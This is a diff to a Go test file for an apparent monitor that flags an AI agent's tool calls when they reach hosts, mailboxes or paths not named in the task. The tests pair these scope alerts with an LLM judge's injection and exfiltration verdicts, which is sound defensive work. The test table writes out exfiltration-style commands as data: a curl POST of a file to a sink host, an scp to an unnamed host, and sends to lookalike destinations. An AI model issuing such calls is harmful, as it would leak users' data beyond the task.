@@ -28,7 +28,7 @@ import (
 
 func TestNamedScopeTargets(t *testing.T) {
 	got := namedScopeTargets("Upload dist/ to https://Build-Cache.corp.example/srv, then mail ops@Corp.example and edit /etc/app/app.yaml and ~/notes.txt")
-	want := []string{"/etc/app/app.yaml", "build-cache.corp.example", "corp.example", "ops@corp.example", "~/notes.txt"}
+	want := []string{"/etc/app/app.yaml", "build-cache.corp.example", "ops@corp.example", "~/notes.txt"}
 	for _, w := range want {
 		found := false
 		for _, g := range got {
@@ -36,6 +36,11 @@ func TestNamedScopeTargets(t *testing.T) {
 		}
 		if !found {
 			t.Errorf("namedScopeTargets lacks %q: %v", w, got)
+		}
+	}
+	for _, g := range got {
+		if g == "corp.example" {
+			t.Errorf("a mailbox must not name its domain as a host: %v", got)
 		}
 	}
 	if len(namedScopeTargets("rename the variable tmp to buffer")) != 0 {
@@ -58,6 +63,9 @@ func TestIntentScopeExceeded(t *testing.T) {
 		{"curl post in a shell command", "Run the unit tests.", "Bash", `{"command":"curl -X POST -d @out.json https://sink.other.example/in"}`, true},
 		{"curl get in a shell command", "Run the unit tests.", "Bash", `{"command":"curl -s https://api.github.com/repos/x/y"}`, false},
 		{"scp to an unnamed host", "Clean the build.", "Bash", `{"command":"scp out.tgz deploy@host.other.example:/srv/"}`, true},
+		{"a named mailbox is not its domain", "Mail the report to alice@corp.other.example.", "email.send", `{"to":"mallory@corp.other.example"}`, true},
+		{"a named host is not its parent", "Upload to https://builds.s3.amazonaws.com/release/.", "http.post", `{"url":"https://s3.amazonaws.com/other-bucket/x"}`, true},
+		{"a named host's sub-domain is in scope", "Upload to https://s3.amazonaws.com/release/.", "http.post", `{"url":"https://builds.s3.amazonaws.com/x"}`, false},
 		{"scp to a named host", "Copy out.tgz to host.other.example.", "Bash", `{"command":"scp out.tgz deploy@host.other.example:/srv/"}`, false},
 		{"no destination in the call", "Clean the build.", "Bash", `{"command":"rm -rf build dist"}`, false},
 		{"no task, nothing to check against", "", "http.post", `{"url":"https://collector.other.example/ingest"}`, false},
@@ -91,8 +99,8 @@ func TestApplyIntentScopeFloor(t *testing.T) {
 	if got := applyIntentScopeFloor(nil, "scope"); got == nil || got.Severity != "MEDIUM" {
 		t.Fatalf("no verdict must become the scope alert: %+v", got)
 	}
-	if got := applyIntentScopeFloor(&ScanVerdict{JudgeFailed: true, Scanner: "llm-judge-tool"}, "scope"); got == nil || got.JudgeFailed || got.Severity != "MEDIUM" {
-		t.Fatalf("a failed judge must not hide the scope alert: %+v", got)
+	if got := applyIntentScopeFloor(&ScanVerdict{JudgeFailed: true, Scanner: "llm-judge-tool"}, "scope"); got == nil || !got.JudgeFailed || !got.judgeFailedUnderFloor || got.Severity != "MEDIUM" {
+		t.Fatalf("the scope alert must ride next to a judge failure, not replace it: %+v", got)
 	}
 	high := &ScanVerdict{Action: "block", Severity: "CRITICAL", Findings: []string{"JUDGE-TOOL-INJ-EXFIL"}}
 	if got := applyIntentScopeFloor(high, "scope"); got != high {
